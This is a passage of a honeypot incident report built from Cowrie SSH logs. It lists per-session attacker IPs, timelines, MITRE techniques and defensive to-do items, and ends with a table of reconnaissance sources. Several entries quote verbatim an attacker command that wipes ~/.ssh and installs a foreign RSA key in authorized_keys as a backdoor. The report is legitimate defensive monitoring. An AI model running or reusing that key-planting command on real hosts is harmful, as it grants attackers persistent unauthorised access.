| **Last Seen** | 2026-03-16 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:29:58` | `cowrie.session.connect` |
| `2026-03-16 13:29:58` | `cowrie.client.version` |
| `2026-03-16 13:29:59` | `cowrie.client.kex` |
| `2026-03-16 13:29:59` | `cowrie.login.success` |
| `2026-03-16 13:30:00` | `cowrie.session.params` |
| `2026-03-16 13:30:00` | `cowrie.command.input` |
| `2026-03-16 13:30:00` | `cowrie.log.closed` |
| `2026-03-16 13:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95460d309968

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:30 |
| **Last Seen** | 2026-03-16 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:30:56` | `cowrie.session.connect` |
| `2026-03-16 13:30:56` | `cowrie.client.version` |
| `2026-03-16 13:30:56` | `cowrie.client.kex` |
| `2026-03-16 13:30:57` | `cowrie.login.success` |
| `2026-03-16 13:30:57` | `cowrie.session.params` |
| `2026-03-16 13:30:57` | `cowrie.command.input` |
| `2026-03-16 13:30:58` | `cowrie.log.closed` |
| `2026-03-16 13:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2c8b4b8234

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:31 |
| **Last Seen** | 2026-03-16 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:31:09` | `cowrie.session.connect` |
| `2026-03-16 13:31:09` | `cowrie.client.version` |
| `2026-03-16 13:31:09` | `cowrie.client.kex` |
| `2026-03-16 13:31:10` | `cowrie.login.success` |
| `2026-03-16 13:31:10` | `cowrie.session.params` |
| `2026-03-16 13:31:10` | `cowrie.command.input` |
| `2026-03-16 13:31:11` | `cowrie.log.closed` |
| `2026-03-16 13:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a25e1b70789d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-03-16 14:30 |
| **Last Seen** | 2026-03-16 14:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:30:28` | `cowrie.session.connect` |
| `2026-03-16 14:30:28` | `cowrie.client.version` |
| `2026-03-16 14:30:28` | `cowrie.client.kex` |
| `2026-03-16 14:30:29` | `cowrie.login.success` |
| `2026-03-16 14:30:30` | `cowrie.session.params` |
| `2026-03-16 14:30:30` | `cowrie.command.input` |
| `2026-03-16 14:30:30` | `cowrie.command.failed` |
| `2026-03-16 14:30:30` | `cowrie.log.closed` |
| `2026-03-16 14:30:30` | `cowrie.session.params` |
| `2026-03-16 14:30:30` | `cowrie.command.input` |
| `2026-03-16 14:30:31` | `cowrie.session.file_download` |
| `2026-03-16 14:30:31` | `cowrie.log.closed` |
| `2026-03-16 14:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb44fea1d22b

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-03-16 14:30 |
| **Last Seen** | 2026-03-16 14:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:30:33` | `cowrie.session.connect` |
| `2026-03-16 14:30:33` | `cowrie.client.version` |
| `2026-03-16 14:30:34` | `cowrie.client.kex` |
| `2026-03-16 14:30:35` | `cowrie.login.success` |
| `2026-03-16 14:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c55542a4f1

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-03-16 14:36 |
| **Last Seen** | 2026-03-16 14:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:36:58` | `cowrie.session.connect` |
| `2026-03-16 14:36:58` | `cowrie.client.version` |
| `2026-03-16 14:36:58` | `cowrie.client.kex` |
| `2026-03-16 14:36:59` | `cowrie.login.success` |
| `2026-03-16 14:36:59` | `cowrie.session.params` |
| `2026-03-16 14:36:59` | `cowrie.command.input` |
| `2026-03-16 14:36:59` | `cowrie.command.failed` |
| `2026-03-16 14:36:59` | `cowrie.log.closed` |
| `2026-03-16 14:37:00` | `cowrie.session.params` |
| `2026-03-16 14:37:00` | `cowrie.command.input` |
| `2026-03-16 14:37:00` | `cowrie.session.file_download` |
| `2026-03-16 14:37:00` | `cowrie.log.closed` |
| `2026-03-16 14:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8212973fc484

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-03-16 14:37 |
| **Last Seen** | 2026-03-16 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:37:03` | `cowrie.session.connect` |
| `2026-03-16 14:37:03` | `cowrie.client.version` |
| `2026-03-16 14:37:03` | `cowrie.client.kex` |
| `2026-03-16 14:37:04` | `cowrie.login.success` |
| `2026-03-16 14:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0278901ded

| Field | Detail |
|---|---|
| **Source IP** | `108.173.137[.]12` |
| **First Seen** | 2026-03-16 14:37 |
| **Last Seen** | 2026-03-16 14:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:37:42` | `cowrie.session.connect` |
| `2026-03-16 14:37:42` | `cowrie.client.version` |
| `2026-03-16 14:37:42` | `cowrie.client.kex` |
| `2026-03-16 14:37:43` | `cowrie.login.success` |
| `2026-03-16 14:37:44` | `cowrie.session.params` |
| `2026-03-16 14:37:44` | `cowrie.command.input` |
| `2026-03-16 14:37:44` | `cowrie.command.failed` |
| `2026-03-16 14:37:44` | `cowrie.log.closed` |
| `2026-03-16 14:37:45` | `cowrie.session.params` |
| `2026-03-16 14:37:45` | `cowrie.command.input` |
| `2026-03-16 14:37:45` | `cowrie.session.file_download` |
| `2026-03-16 14:37:45` | `cowrie.log.closed` |
| `2026-03-16 14:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.173.137[.]12` to AbuseIPDB if not already reported
- [ ] Block `108.173.137[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d51435f064

| Field | Detail |
|---|---|
| **Source IP** | `108.173.137[.]12` |
| **First Seen** | 2026-03-16 14:37 |
| **Last Seen** | 2026-03-16 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:37:48` | `cowrie.session.connect` |
| `2026-03-16 14:37:48` | `cowrie.client.version` |
| `2026-03-16 14:37:49` | `cowrie.client.kex` |
| `2026-03-16 14:37:50` | `cowrie.login.success` |
| `2026-03-16 14:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.173.137[.]12` to AbuseIPDB if not already reported
- [ ] Block `108.173.137[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1babc947f58c

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-03-16 14:43 |
| **Last Seen** | 2026-03-16 14:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:43:11` | `cowrie.session.connect` |
| `2026-03-16 14:43:11` | `cowrie.client.version` |
| `2026-03-16 14:43:11` | `cowrie.client.kex` |
| `2026-03-16 14:43:12` | `cowrie.login.success` |
| `2026-03-16 14:43:13` | `cowrie.session.params` |
| `2026-03-16 14:43:13` | `cowrie.command.input` |
| `2026-03-16 14:43:13` | `cowrie.command.failed` |
| `2026-03-16 14:43:13` | `cowrie.log.closed` |
| `2026-03-16 14:43:13` | `cowrie.session.params` |
| `2026-03-16 14:43:13` | `cowrie.command.input` |
| `2026-03-16 14:43:14` | `cowrie.session.file_download` |
| `2026-03-16 14:43:14` | `cowrie.log.closed` |
| `2026-03-16 14:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c564747dc36

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-03-16 14:43 |
| **Last Seen** | 2026-03-16 14:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:43:19` | `cowrie.session.connect` |
| `2026-03-16 14:43:19` | `cowrie.client.version` |
| `2026-03-16 14:43:19` | `cowrie.client.kex` |
| `2026-03-16 14:43:20` | `cowrie.login.success` |
| `2026-03-16 14:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1a84a6dbc5

| Field | Detail |
|---|---|
| **Source IP** | `108.173.137[.]12` |
| **First Seen** | 2026-03-16 14:43 |
| **Last Seen** | 2026-03-16 14:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:43:37` | `cowrie.session.connect` |
| `2026-03-16 14:43:37` | `cowrie.client.version` |
| `2026-03-16 14:43:37` | `cowrie.client.kex` |
| `2026-03-16 14:43:38` | `cowrie.login.success` |
| `2026-03-16 14:43:39` | `cowrie.session.params` |
| `2026-03-16 14:43:39` | `cowrie.command.input` |
| `2026-03-16 14:43:39` | `cowrie.command.failed` |
| `2026-03-16 14:43:39` | `cowrie.log.closed` |
| `2026-03-16 14:43:39` | `cowrie.session.params` |
| `2026-03-16 14:43:39` | `cowrie.command.input` |
| `2026-03-16 14:43:40` | `cowrie.session.file_download` |
| `2026-03-16 14:43:40` | `cowrie.log.closed` |
| `2026-03-16 14:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.173.137[.]12` to AbuseIPDB if not already reported
- [ ] Block `108.173.137[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15dac0da46cc

| Field | Detail |
|---|---|
| **Source IP** | `108.173.137[.]12` |
| **First Seen** | 2026-03-16 14:43 |
| **Last Seen** | 2026-03-16 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:43:43` | `cowrie.session.connect` |
| `2026-03-16 14:43:43` | `cowrie.client.version` |
| `2026-03-16 14:43:43` | `cowrie.client.kex` |
| `2026-03-16 14:43:44` | `cowrie.login.success` |
| `2026-03-16 14:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.173.137[.]12` to AbuseIPDB if not already reported
- [ ] Block `108.173.137[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-210510522201

| Field | Detail |
|---|---|
| **Source IP** | `101.36.118[.]177` |
| **First Seen** | 2026-03-16 14:50 |
| **Last Seen** | 2026-03-16 14:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 14:50:03` | `cowrie.session.connect` |
| `2026-03-16 14:50:03` | `cowrie.client.version` |
| `2026-03-16 14:50:03` | `cowrie.client.kex` |
| `2026-03-16 14:50:03` | `cowrie.login.success` |
| `2026-03-16 14:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.118[.]177` to AbuseIPDB if not already reported
- [ ] Block `101.36.118[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.199[.]28` | **194** | 2026-03-16 04:53 | 2026-03-16 05:07 | 124m | 137 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.93.128[.]179` | **11** | 2026-03-16 09:38 | 2026-03-16 10:03 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.109[.]176` | **10** | 2026-03-16 02:29 | 2026-03-16 02:50 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.122[.]139` | **10** | 2026-03-16 02:25 | 2026-03-16 02:47 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.122[.]186` | **10** | 2026-03-16 00:10 | 2026-03-16 00:28 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `108.173.137[.]12` | **10** | 2026-03-16 14:23 | 2026-03-16 14:43 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.132.249[.]164` | **10** | 2026-03-16 10:07 | 2026-03-16 10:17 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `118.122.147[.]195` | **10** | 2026-03-16 00:31 | 2026-03-16 00:45 | 12m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.39[.]127` | **10** | 2026-03-16 02:30 | 2026-03-16 02:50 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.250[.]47` | **10** | 2026-03-16 09:42 | 2026-03-16 10:02 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.191.157[.]64` | **10** | 2026-03-16 14:20 | 2026-03-16 14:43 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.208.24[.]217` | **10** | 2026-03-16 00:08 | 2026-03-16 00:28 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.178[.]165` | **10** | 2026-03-16 00:29 | 2026-03-16 00:38 | 14m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `38.137.11[.]14` | **10** | 2026-03-16 01:29 | 2026-03-16 01:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.219.245[.]57` | **9** | 2026-03-16 12:37 | 2026-03-16 12:57 | 9m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `16.58.56[.]214` | **5** | 2026-03-16 03:25 | 2026-03-16 03:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]67` | **4** | 2026-03-16 02:29 | 2026-03-16 02:43 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `112.32.139[.]197` | **4** | 2026-03-16 10:00 | 2026-03-16 10:26 | 8m | 0 | `T1592` | 🟢 LOW |
| `124.29.230[.]248` | **4** | 2026-03-16 00:00 | 2026-03-16 00:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.237.121[.]226` | **4** | 2026-03-16 05:27 | 2026-03-16 05:27 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `18.220.248[.]172` | **3** | 2026-03-16 08:40 | 2026-03-16 08:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `41.111.162[.]34` | **3** | 2026-03-16 07:32 | 2026-03-16 07:37 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.118[.]177` | **2** | 2026-03-16 14:48 | 2026-03-16 14:49 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `117.71.53[.]210` | **2** | 2026-03-16 11:36 | 2026-03-16 11:56 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `118.185.85[.]137` | **2** | 2026-03-16 09:43 | 2026-03-16 09:44 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `120.241.79[.]66` | **2** | 2026-03-16 11:35 | 2026-03-16 11:43 | 3m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `13.89.124[.]223` | **2** | 2026-03-16 12:39 | 2026-03-16 12:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `171.237.176[.]209` | **2** | 2026-03-16 14:43 | 2026-03-16 14:52 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.168.122[.]81` | **2** | 2026-03-16 00:47 | 2026-03-16 00:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `209.38.80[.]6` | **2** | 2026-03-16 05:17 | 2026-03-16 05:18 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.78.65[.]246` | **2** | 2026-03-16 09:16 | 2026-03-16 09:16 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.79.154[.]157` | **2** | 2026-03-16 09:16 | 2026-03-16 09:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.254.155[.]94` | **2** | 2026-03-16 07:47 | 2026-03-16 07:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `69.180.188[.]173` | **2** | 2026-03-16 09:33 | 2026-03-16 09:53 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.13.5[.]50` | 1 | 2026-03-16 06:22 | 2026-03-16 06:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.71.37[.]208` | 1 | 2026-03-16 13:13 | 2026-03-16 13:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `101.71.39[.]14` | 1 | 2026-03-16 09:15 | 2026-03-16 09:15 | 14s | 0 | `T1592` | 🟢 LOW |
| `102.38.3[.]181` | 1 | 2026-03-16 02:50 | 2026-03-16 02:50 | 8s | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]213` | 1 | 2026-03-16 00:29 | 2026-03-16 00:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.215.80[.]173` | 1 | 2026-03-16 14:43 | 2026-03-16 14:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.1.94[.]107` | 1 | 2026-03-16 01:10 | 2026-03-16 01:11 | 15s | 0 | `T1592` | 🟢 LOW |
| `112.168.71[.]109` | 1 | 2026-03-16 04:44 | 2026-03-16 04:44 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.19.44[.]93` | 1 | 2026-03-16 11:52 | 2026-03-16 11:52 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.6.11[.]184` | 1 | 2026-03-16 12:16 | 2026-03-16 12:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `114.33.44[.]32` | 1 | 2026-03-16 06:56 | 2026-03-16 06:57 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.175.160[.]58` | 1 | 2026-03-16 02:35 | 2026-03-16 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.192.42[.]14` | 1 | 2026-03-16 02:34 | 2026-03-16 02:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `117.245.138[.]2` | 1 | 2026-03-16 08:18 | 2026-03-16 08:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.145.74[.]48` | 1 | 2026-03-16 00:33 | 2026-03-16 00:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.163.178[.]146` | 1 | 2026-03-16 11:29 | 2026-03-16 11:31 | 117s | 0 | `T1592` | 🟢 LOW |
| `118.26.153[.]102` | 1 | 2026-03-16 07:59 | 2026-03-16 07:59 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-03-16 01:07 | 2026-03-16 01:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.29[.]51` | 1 | 2026-03-16 00:10 | 2026-03-16 00:12 | 120s | 0 | `T1592` | 🟢 LOW |
